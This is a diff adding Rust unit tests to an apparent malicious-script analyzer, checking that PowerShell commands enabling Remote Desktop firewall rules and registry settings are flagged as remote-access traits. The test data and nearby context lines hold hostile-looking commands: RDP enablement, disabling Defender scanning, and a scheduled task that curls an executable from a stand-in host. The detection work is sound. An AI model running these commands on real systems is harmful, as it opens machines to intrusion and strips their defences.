@@ -30687,6 +30687,79 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_positional_rdp_firewall_rule_name_emits_remote_access_trait() {
+        let script =
+            br#"powershell -Command "Enable-NetFirewallRule RemoteDesktop-UserMode-In-TCP""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open"
+                        && target == "RemoteDesktop-UserMode-In-TCP"
+            )),
+            "positional RDP firewall rule-name enablement missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_positional_rdp_registry_values_emit_remote_access_trait() {
+        let script = br#"powershell -Command "Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-enable" && target == "Terminal Server"
+            )),
+            "positional PowerShell RDP registry enablement missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_rdp_firewall_rule_name_emits_remote_access_trait() {
+        let script =
+            br#"powershell -Command "Enable-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open"
+                        && target == "RemoteDesktop-UserMode-In-TCP"
+            )),
+            "RDP firewall rule-name enablement missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_rdp_firewall_rule_name_list_emits_each_remote_access_trait() {
+        let script = br#"powershell -Command "Enable-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP, RemoteDesktop-UserMode-In-UDP""#;
+        let report = analyze(script, &Config::default());
+
+        for rule_name in [
+            "RemoteDesktop-UserMode-In-TCP",
+            "RemoteDesktop-UserMode-In-UDP",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::RemoteAccess { technique, target, .. }
+                        if technique == "rdp-firewall-open" && target == rule_name
+                )),
+                "RDP firewall rule-name {rule_name} enablement missing: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_scheduled_task_delayed_url_does_not_cross_cmd_separator() {
         let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/V:ON /c set U=https://ps-task.example/p.exe&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
 "#;
